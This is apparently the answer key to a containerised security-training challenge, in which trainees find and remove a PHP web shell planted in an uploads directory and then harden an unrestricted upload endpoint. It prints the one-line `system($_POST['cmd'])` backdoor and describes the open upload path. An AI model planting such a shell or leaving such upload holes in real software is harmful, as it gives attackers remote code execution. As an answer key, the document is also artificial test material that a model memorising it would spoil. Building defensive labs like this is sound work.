# Challenge 09 Answer Key — The Upload Portal

**DO NOT READ BEFORE ATTEMPTING THE CHALLENGE**

## Learning Objectives
- Recognize a minimal PHP command-execution backdoor disguised as a legitimate uploaded file
- Practice web-root triage: distinguishing planted files from real user uploads
- Remediate without deleting legitimate site content

## Hints
- Not every file under `uploads/` was actually uploaded by a real user.
- A PHP file that does nothing but call `system()` on a POST parameter isn't a thumbnail generator.
- `grep -r "system(" uploads/` is a fast way to triage a whole directory.

## Scoring breakdown
| Points | Criteria |
|---|---|
| +1 | No command-execution backdoor remains under the web root |
| +1 | Company site (`/`) still returns 200 |
| +1 | Legitimate uploaded file still returns 200 |
| +1 (bonus) | `/upload.php` no longer accepts and executes `.php` uploads |

## What's broken / planted
`site/uploads/thumb_8f2a.php` is a planted backdoor: `if (isset($_POST['cmd'])) { system($_POST['cmd']); }`, baked into the image at `docker build` time alongside the legitimate `site/index.html` and `site/uploads/welcome.txt`. The container serves the whole `site/` tree via PHP's built-in server, so any `.php` file under the web root executes.

`site/upload.php` is a real, unrestricted-file-upload endpoint (the "share your widget photo" form on the homepage) with no extension/MIME allowlisting — it's how the backdoor could plausibly have gotten there, and it's still open. `VARIANT=redteam docker compose up -d --build` boots the same box with `upload.php` present but `thumb_8f2a.php` not pre-planted, as an ungraded attack-practice mode (upload your own `.php` payload, get code execution, see the path firsthand).

`site/uploads/` also ships a batch of decoy noise so the backdoor isn't the only PHP file in the directory: `thumb_2b7f.php` and `thumb_c19a.php` are benign "thumbnail cache" scripts (same `thumb_<hex>.php` naming pattern as the real backdoor, but they just `readfile()` a fake photo — no user input reaches them), `diag.php` is a benign leftover ops script that runs `system('df -h ...')` against a hardcoded, non-attacker-controlled argument, and `IMG_2044.jpg`/`IMG_2091.jpg`/`widget_booth_selfie.jpg`/`contest_entry_017.png`/`entry_notes.txt`/`.DS_Store` are plain non-executable clutter. None of these are graded — `score_me.sh` only greps for the literal `system($_POST` pattern, which only `thumb_8f2a.php` contains — but a naive `grep -rl 'system('` (dropping the `$_POST` half) now returns both `thumb_8f2a.php` and `diag.php`, so name/grep pattern-matching alone no longer isolates the real backdoor; the payload argument is what actually distinguishes it.

## Step-by-step fix
1. `docker compose exec web sh`
2. `grep -rl 'system(' /var/www/html` — now returns two hits: `/var/www/html/uploads/thumb_8f2a.php` and `/var/www/html/uploads/diag.php`. Read both: `diag.php` calls `system()` with a hardcoded, escaped path (no attacker input); `thumb_8f2a.php` calls it directly on `$_POST['cmd']`. That's the backdoor.
3. `rm /var/www/html/uploads/thumb_8f2a.php`
4. `exit`, then `./scripts/score_me.sh` from the host to confirm `3 / 3`.
5. (Bonus) Harden `upload.php` against executable uploads — e.g. reject any filename not ending in an image extension before calling `move_uploaded_file`. Re-run `./scripts/score_me.sh` to confirm the bonus check now passes too (`4 / 4`).

## Validation
Ran a fresh `docker compose up -d --build` on 2026-08-14, confirmed `./scripts/score_me.sh` showed `2 / 3` (backdoor present, site/legit-file both already fine), then applied the steps above verbatim and confirmed `3 / 3`. Torn down with `docker compose down -v` afterward.

Re-validated on 2026-09-16 after adding the real `upload.php` endpoint and `VARIANT` toggle: confirmed default mode still scores `3 / 3` after step 3, confirmed the bonus check fails until `upload.php` is hardened per step 5 and then passes (`4 / 4`), and confirmed `VARIANT=redteam docker compose up -d --build` boots with no `thumb_8f2a.php` present while `upload.php` still accepts and executes an uploaded `.php` payload. Torn down with `docker compose down -v` afterward.

Re-validated on 2026-09-18 after adding the decoy noise files listed above (to make the backdoor harder to spot by name/grep alone). Confirmed a fresh `docker compose up -d --build` still scores `2 / 3` with the backdoor present, confirmed `thumb_2b7f.php`, `thumb_c19a.php`, and `diag.php` all return `200` and behave as their benign cover story implies (thumbnails serve their fake source image's bytes back, `diag.php` prints real `df -h` output), confirmed `grep -rl 'system(' /var/www/html` now returns `thumb_8f2a.php` and `diag.php` both, and confirmed removing only `thumb_8f2a.php` still scores a clean `3 / 3` with every decoy file left in place. Torn down with `docker compose down -v` afterward.
